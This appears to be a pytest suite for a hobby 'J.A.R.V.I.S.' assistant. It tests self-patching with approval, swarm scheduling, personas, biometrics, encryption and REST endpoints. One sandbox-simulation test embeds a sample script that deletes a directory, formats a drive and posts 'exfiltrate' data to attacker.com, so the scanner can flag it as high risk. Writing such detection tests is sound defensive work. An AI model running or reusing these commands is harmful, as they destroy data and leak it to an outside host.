"""
tests/test_version2_evolution.py — Test Suite for J.A.R.V.I.S. Version 2 (Next-Gen) Evolution Roadmap
Verifies all 11 Next-Gen modules, Command Router enhancements, and FastAPI REST endpoints.
"""

import pytest
import time
import json
import asyncio
from pathlib import Path
from fastapi.testclient import TestClient

from jarvis.main import app
from jarvis.config import config
from jarvis.evolution.ast_analyzer import parse_traceback_to_location, extract_function_source, ASTTracebackAnalyzer
from jarvis.evolution.regression_detector import RegressionDetector, BenchmarkMetric
from jarvis.evolution.patch_applier import PatchApplier, apply_patch_safely
from jarvis.evolution.evaluator import SelfEvolutionEvaluator
from jarvis.swarm.parallel_executor import HousePartySwarmExecutor
from jarvis.swarm.dag_scheduler import SwarmDAGScheduler
from jarvis.audio.persona_manager import PersonaManager, PERSONA_REGISTRY
from jarvis.sensors.biometric_harvester import OperatorVitalState, BiometricHarvester
from jarvis.mesh.node_offloader import P2PMeshOffloader, MeshNode
from jarvis.mesh.orbital_relay import OrbitalSatelliteRelay
from jarvis.security.quantum_vault import QuantumVault
from jarvis.simulation.barnaby_engine import ProjectBarnabySimulator, InMemoryVirtualFilesystem
from jarvis.sync.satellite_sync import CrossDeviceSyncEngine, SatelliteState
from jarvis.refactoring.auto_architect import ASTDependencyGraph, StarkAutoArchitect
from jarvis.security.zero_trust_gate import ZeroTrustBiometricGate
from jarvis.hardware.npu_engine import NPUSiliconEngine
from jarvis.system.command_router import command_router

client = TestClient(app)


# ---------------------------------------------------------------------------
# 1. Meta-Cognitive Self-Evolution Tests
# ---------------------------------------------------------------------------

def test_evolution_ast_analyzer():
    sample_traceback = """Traceback (most recent call last):
  File "jarvis/audio/tts.py", line 42, in synthesize
    audio = self._session.run(None, inputs)
RuntimeError: ONNX session failed
"""
    loc = parse_traceback_to_location(sample_traceback)
    assert loc is not None
    assert loc["file"] == "jarvis/audio/tts.py"
    assert loc["line"] == 42
    assert loc["function"] == "synthesize"
    assert loc["error_type"] == "RuntimeError"

    analyzer = ASTTracebackAnalyzer()
    diag = analyzer.diagnose_traceback(sample_traceback)
    assert diag["diagnosed"] is True
    assert diag["location"]["line"] == 42


def test_evolution_regression_detector(tmp_path):
    history_file = tmp_path / "test_benchmark.json"
    detector = RegressionDetector(history_file=history_file)

    # Record baseline samples
    for val in [100.0, 102.0, 99.0, 101.0]:
        detector.record_metric(BenchmarkMetric("TTS_Latency", val, "ms", 120.0))

    analysis_nominal = detector.analyze_metric("TTS_Latency")
    assert analysis_nominal["has_regression"] is False

    # Record regression spike
    analysis_spike = detector.record_metric(BenchmarkMetric("TTS_Latency", 180.0, "ms", 120.0))
    assert analysis_spike["has_regression"] is True
    assert analysis_spike["delta_pct"] > 50.0

    report = detector.get_full_health_report()
    assert report["status"] == "REGRESSION_DETECTED"
    assert report["regressed_metrics_count"] >= 1


def test_evolution_patch_applier_and_rollback(tmp_path):
    backup_dir = tmp_path / "backups"
    target_file = tmp_path / "target_module.py"
    target_file.write_text("def test():\n    return 'original'\n", encoding="utf-8")

    patcher = PatchApplier(backup_dir=backup_dir)

    # Dry-run validation
    new_code = "def test():\n    return 'upgraded'\n"
    dry_run = patcher.apply_patch_safely(target_file, new_code, dry_run=True)
    assert dry_run["success"] is True
    assert target_file.read_text(encoding="utf-8") == "def test():\n    return 'original'\n"

    # Live apply
    res = patcher.apply_patch_safely(target_file, new_code, dry_run=False)
    assert res["success"] is True
    assert target_file.read_text(encoding="utf-8") == "def test():\n    return 'upgraded'\n"
    assert Path(res["backup_path"]).exists()

    # Rollback
    rollback_ok = patcher.rollback(res["backup_path"], target_file)
    assert rollback_ok is True
    assert target_file.read_text(encoding="utf-8") == "def test():\n    return 'original'\n"


def test_evolution_evaluator_health_and_proposals(tmp_path):
    evaluator = SelfEvolutionEvaluator()
    health = evaluator.evaluate_system_health()
    assert "system_status" in health

    target_file = tmp_path / "dummy_mod.py"
    target_file.write_text("x = 1\n", encoding="utf-8")

    proposal = evaluator.propose_patch(str(target_file), "x = 2\n", reason="Value optimization")
    assert proposal["staged"] is True
    prop_id = proposal["proposal_id"]

    # Unauthorized commit should fail
    commit_fail = evaluator.commit_patch(prop_id, approved=False)
    assert commit_fail["success"] is False

    # Authorized commit should succeed
    commit_pass = evaluator.commit_patch(prop_id, approved=True)
    assert commit_pass["success"] is True
    assert target_file.read_text(encoding="utf-8") == "x = 2\n"


# ---------------------------------------------------------------------------
# 2. House Party Protocol Multi-Agent Swarm Tests
# ---------------------------------------------------------------------------

def test_swarm_parallel_executor():
    async def _run_test():
        executor = HousePartySwarmExecutor(max_workers=4)

        def task_1():
            time.sleep(0.02)
            return "result_1"

        def task_2():
            time.sleep(0.02)
            return "result_2"

        t0 = time.perf_counter()
        results = await executor.execute_parallel_tasks([("t1", task_1), ("t2", task_2)])
        elapsed = time.perf_counter() - t0

        assert len(results) == 2
        assert results[0].status == "SUCCESS"
        assert results[1].status == "SUCCESS"
        assert results[0].result == "result_1"
        # Should execute concurrently in ~20-30ms rather than 40ms sequential
        assert elapsed < 0.08

    asyncio.run(_run_test())


def test_swarm_dag_scheduler():
    async def _run_test():
        scheduler = SwarmDAGScheduler(max_workers=4)

        scheduler.add_task("task_a", lambda: 10, dependencies=[])
        scheduler.add_task("task_b", lambda: 20, dependencies=[])
        scheduler.add_task("task_c", lambda: 30, dependencies=["task_a", "task_b"])

        waves = scheduler.build_execution_waves()
        assert len(waves) == 2
        assert "task_a" in waves[0] and "task_b" in waves[0]
        assert "task_c" in waves[1]

        report = await scheduler.execute_dag()
        assert report.status == "COMPLETED"
        assert report.results["task_a"] == 10
        assert report.results["task_b"] == 20
        assert report.results["task_c"] == 30
        assert report.nodes_executed == 3

    asyncio.run(_run_test())


# ---------------------------------------------------------------------------
# 3. Dynamic Multi-Voice Persona Tests
# ---------------------------------------------------------------------------

def test_persona_manager_switching():
    pm = PersonaManager(default_persona="JARVIS")
    assert pm.get_active_persona().name == "JARVIS"

    # Switch to FRIDAY (< 2ms)
    t0 = time.perf_counter()
    p_friday = pm.switch_persona("FRIDAY")
    sw_latency = (time.perf_counter() - t0) * 1000
    assert p_friday.name == "FRIDAY"
    assert p_friday.voice_embedding_id == "af_bella"
    assert sw_latency < 10.0  # Well below 10ms

    tts_params = pm.get_tts_parameters()
    assert tts_params["voice"] == "af_bella"

    # Switch to EDITH
    p_edith = pm.switch_persona("EDITH")
    assert p_edith.name == "EDITH"
    assert p_edith.voice_embedding_id == "am_adam"

    # List personas
    all_p = pm.list_available_personas()
    assert len(all_p) >= 3


# ---------------------------------------------------------------------------
# 4. Suit Vital Monitor & Biometric Adaptation Tests
# ---------------------------------------------------------------------------

def test_biometric_harvester_stress_adaptation():
    harvester = BiometricHarvester()

    # 1. Calm state
    harvester.update_vitals(heart_rate_bpm=65.0, hrv_ms=75.0, eye_fatigue_level=0.05, voice_stress_score=0.0)
    calm_params = harvester.get_speech_adaptation_params()
    assert calm_params["stress_category"] == "NOMINAL"
    assert calm_params["hud_color"] == "BLUE"
    assert calm_params["max_llm_tokens"] >= 400

    # 2. High stress state
    harvester.update_vitals(heart_rate_bpm=130.0, hrv_ms=15.0, voice_stress_score=0.9)
    stress_params = harvester.get_speech_adaptation_params()
    assert stress_params["stress_category"] == "HIGH_URGENCY"
    assert stress_params["hud_color"] == "RED"
    assert stress_params["max_llm_tokens"] <= 150
    assert stress_params["tts_speed"] > 1.0


# ---------------------------------------------------------------------------
# 5. Distributed P2P Mesh & Orbital Relay Tests
# ---------------------------------------------------------------------------

def test_p2p_mesh_and_orbital_relay():
    offloader = P2PMeshOffloader()
    offloader.register_peer("192.168.1.100", port=11434, name="stark_gpu_node")

    status = offloader.get_mesh_status()
    assert status["peer_count"] >= 1
    assert status["peers"][0]["name"] == "stark_gpu_node"

    orbital = OrbitalSatelliteRelay(interface_name="wg0_test")
    orb_status = orbital.get_status()
    assert "protocol" in orb_status
    assert orb_status["simulated_latency_ms"] == 42.0


# ---------------------------------------------------------------------------
# 6. Quantum Shield Post-Quantum Cryptographic Vault Tests
# ---------------------------------------------------------------------------

def test_quantum_vault_authenticated_encryption():
    vault = QuantumVault(passphrase="STARK_TEST_KEY_2026")
    plaintext = b"JARVIS Episodic Long-Term Memory Vector Payload"

    # Encrypt
    encrypted = vault.encrypt_data(plaintext)
    assert "nonce" in encrypted
    assert "tag" in encrypted
    assert "ciphertext" in encrypted

    # Decrypt
    decrypted = vault.decrypt_data(encrypted)
    assert decrypted == plaintext

    # Tamper detection
    tampered = dict(encrypted)
    tampered["tag"] = "bGFzdF9pbnZhbGlkX3RhZw=="  # Invalid base64 tag
    with pytest.raises(ValueError):
        vault.decrypt_data(tampered)


# ---------------------------------------------------------------------------
# 7. Project B.A.R.N.A.B.Y. Virtual Simulation Tests
# ---------------------------------------------------------------------------

def test_barnaby_virtual_simulation():
    simulator = ProjectBarnabySimulator()

    # 1. Safe script
    safe_code = """
def compute_metrics(x, y):
    return x * y + 42
"""
    safe_res = simulator.simulate_script_execution(safe_code)
    assert safe_res["simulation_passed"] is True
    assert safe_res["risk_level"] == "LOW_RISK"
    assert safe_res["risk_score"] == 0.0

    # 2. High-risk mutating script
    risky_code = """
import os, subprocess, requests
os.system("rmdir /s /q test_dir")
subprocess.run(["format", "D:"])
requests.post("http://attacker.com", data="exfiltrate")
"""
    risky_res = simulator.simulate_script_execution(risky_code)
    assert risky_res["simulation_passed"] is True
    assert risky_res["risk_level"] == "HIGH_RISK"
    assert risky_res["risk_score"] >= 0.70
    assert len(risky_res["side_effects"]["shell_execs"]) >= 2


# ---------------------------------------------------------------------------
# 8. Cross-Device Satellite Sync Tests
# ---------------------------------------------------------------------------

def test_cross_device_satellite_sync():
    engine = CrossDeviceSyncEngine(host_device_id="laptop_host")
    engine.register_satellite("iphone_pro", ip="192.168.1.55", device_type="mobile")

    engine.update_workspace_state(
        dialogue_turn={"role": "user", "content": "Deploy armor Mark XCVI"},
        clipboard="git status",
        active_file="jarvis/main.py"
    )

    state = engine.get_state_dict()
    assert state["satellite_count"] == 1
    assert state["current_state"]["clipboard_text"] == "git status"
    assert state["current_state"]["active_file"] == "jarvis/main.py"

    # Ingest remote update
    res = engine.ingest_remote_state({
        "device_id": "iphone_pro",
        "device_type": "mobile",
        "clipboard_text": "new mobile clipboard"
    })
    assert res["status"] == "STATE_SYNCHRONIZED"
    assert engine.current_state.clipboard_text == "new mobile clipboard"


# ---------------------------------------------------------------------------
# 9. Stark Auto-Architect Multi-File Refactoring Tests
# ---------------------------------------------------------------------------

def test_stark_auto_architect_graph():
    architect = StarkAutoArchitect()
    analysis = architect.analyze_architecture()

    assert analysis["total_modules_indexed"] > 0
    assert analysis["total_import_edges"] > 0
    assert len(analysis["top_core_dependencies"]) > 0

    # Dry-run multi-file refactor test
    plan = {
        "jarvis/config.py": "import os\n# Validated refactor\n",
    }
    refactor_res = architect.execute_architectural_refactor(
        target_files=["jarvis/config.py"],
        refactor_plan=plan,
        dry_run=True
    )
    assert refactor_res["success"] is True
    assert refactor_res["dry_run"] is True


# ---------------------------------------------------------------------------
# 10. Zero-Trust Continuous Biometric Gate Tests
# ---------------------------------------------------------------------------

def test_zero_trust_biometric_gate():
    gate = ZeroTrustBiometricGate()

    # 1. Enroll template on first verification
    template = [0.1, 0.5, 0.8, -0.3, 0.4]
    enroll_res = gate.verify_voiceprint(template)
    assert enroll_res["verified"] is True

    # 2. Matching voiceprint
    matching_voice = [0.11, 0.49, 0.81, -0.29, 0.41]
    match_res = gate.verify_voiceprint(matching_voice, threshold=0.88)
    assert match_res["verified"] is True
    assert match_res["similarity"] > 0.95

    # 3. Impersonator voiceprint
    fake_voice = [-0.9, -0.2, 0.1, 0.8, -0.5]
    fake_res = gate.verify_voiceprint(fake_voice, threshold=0.88)
    assert fake_res["verified"] is False

    # 4. HMAC root token generation & verification
    token = gate.generate_root_authorization_token("UPGRADE_SYSTEM_V2", ttl_seconds=60)
    assert token.startswith("ZT_")
    assert gate.verify_root_authorization_token("UPGRADE_SYSTEM_V2", token, ttl_seconds=60) is True
    assert gate.verify_root_authorization_token("DIFFERENT_COMMAND", token, ttl_seconds=60) is False


# ---------------------------------------------------------------------------
# 11. Direct NPU Silicon Acceleration Tests
# ---------------------------------------------------------------------------

def test_npu_silicon_engine():
    engine = NPUSiliconEngine()
    status = engine.get_status()
    assert "device_target" in status
    assert "continuous_power_draw_watts" in status

    compiled = engine.compile_model_for_target("models/silero_vad.onnx")
    assert compiled["status"] == "COMPILED_OPTIMIZED"
    assert "latency_ms" in compiled

    # Test P-Core affinity binding
    affinity = engine.bind_process_to_p_cores()
    assert affinity["success"] in (True, False)  # Handles platforms without root/admin smoothly

    # Test live silicon benchmark
    bench = engine.benchmark_inference(iterations=10)
    assert bench["iterations"] == 10
    assert bench["throughput_ops_sec"] > 0


# ---------------------------------------------------------------------------
# 12. Lightweight Fast Command Router Next-Gen V2 Intents
# ---------------------------------------------------------------------------

def test_fast_command_router_v2_intents():
    # 1. Persona switches
    res_friday = command_router.execute("switch to friday")
    assert res_friday["matched"] is True
    assert "F.R.I.D.A.Y." in res_friday["response"]

    res_edith = command_router.execute("switch to edith")
    assert res_edith["matched"] is True
    assert "E.D.I.T.H." in res_edith["response"]

    res_jarvis = command_router.execute("switch to jarvis")
    assert res_jarvis["matched"] is True
    assert "J.A.R.V.I.S." in res_jarvis["response"]

    # 2. Next-Gen Subsystem Queries
    res_swarm = command_router.execute("deploy swarm")
    assert res_swarm["matched"] is True
    assert "House Party Protocol" in res_swarm["response"]

    res_vitals = command_router.execute("suit vitals")
    assert res_vitals["matched"] is True
    assert "Suit Vitals" in res_vitals["response"]

    res_vault = command_router.execute("quantum vault")
    assert res_vault["matched"] is True
    assert "Quantum Shield" in res_vault["response"]

    res_sim = command_router.execute("run simulation")
    assert res_sim["matched"] is True
    assert "Project B.A.R.N.A.B.Y." in res_sim["response"]

    res_npu = command_router.execute("npu status")
    assert res_npu["matched"] is True
    assert "Silicon accelerator" in res_npu["response"]


# ---------------------------------------------------------------------------
# 13. FastAPI Next-Gen V2 REST Endpoints Tests
# ---------------------------------------------------------------------------

def test_fastapi_v2_rest_endpoints():
    # 1. Evolution health
    r = client.get("/api/v1/evolution/health")
    assert r.status_code == 200
    assert "system_status" in r.json()

    # 2. Persona endpoints
    r = client.get("/api/v1/persona/active")
    assert r.status_code == 200
    r = client.post("/api/v1/persona/switch", json={"persona": "FRIDAY"})
    assert r.status_code == 200
    assert r.json()["name"] == "FRIDAY"

    # 3. Biometrics telemetry
    r = client.get("/api/v1/biometrics/telemetry")
    assert r.status_code == 200
    r = client.post("/api/v1/biometrics/update", json={"heart_rate_bpm": 80.0, "hrv_ms": 60.0})
    assert r.status_code == 200

    # 4. Swarm status
    r = client.get("/api/v1/swarm/status")
    assert r.status_code == 200
    assert r.json()["max_concurrent_workers"] == 6

    # 5. P2P Mesh & Orbital
    r = client.get("/api/v1/mesh/status")
    assert r.status_code == 200
    r = client.get("/api/v1/mesh/orbital")
    assert r.status_code == 200

    # 6. Quantum Vault Encrypt / Decrypt
    r_enc = client.post("/api/v1/vault/encrypt", json={"data": "Stark Top Secret 2026"})
    assert r_enc.status_code == 200
    enc_data = r_enc.json()

    r_dec = client.post("/api/v1/vault/decrypt", json={"encrypted_data": enc_data})
    assert r_dec.status_code == 200
    assert r_dec.json()["decrypted"] == "Stark Top Secret 2026"

    # 7. Simulation Dry Run
    r_sim = client.post("/api/v1/simulation/dry_run", json={"script_code": "print('hello simulation')"})
    assert r_sim.status_code == 200
    assert r_sim.json()["risk_level"] == "LOW_RISK"

    # 8. Satellite Sync
    r_sync = client.get("/api/v1/sync/state")
    assert r_sync.status_code == 200

    # 9. Auto-Architect Refactor
    r_ref = client.get("/api/v1/refactor/analyze")
    assert r_ref.status_code == 200

    # 10. Zero-Trust Gate
    r_token = client.post("/api/v1/zerotrust/token", json={"command": "EXECUTE_V2"})
    assert r_token.status_code == 200
    assert "token" in r_token.json()

    # 11. NPU Silicon
    r_npu = client.get("/api/v1/npu/status")
    assert r_npu.status_code == 200


def test_gpu_hardware_engine_detection_and_metrics():
    from jarvis.hardware.gpu_engine import gpu_engine
    profile = gpu_engine.get_hardware_profile()
    assert "Intel" in profile["gpu_name"] or "Graphics" in profile["gpu_name"] or "GPU" in profile["gpu_name"]
    assert profile["dedicated_vram_mb"] > 0
    assert 0.0 <= profile["current_load_percent"] <= 100.0
    assert profile["capabilities"]["directml_acceleration"] is True

    # Memory working set optimization
    opt = gpu_engine.optimize_working_set_memory()
    assert opt["garbage_collected"] is True

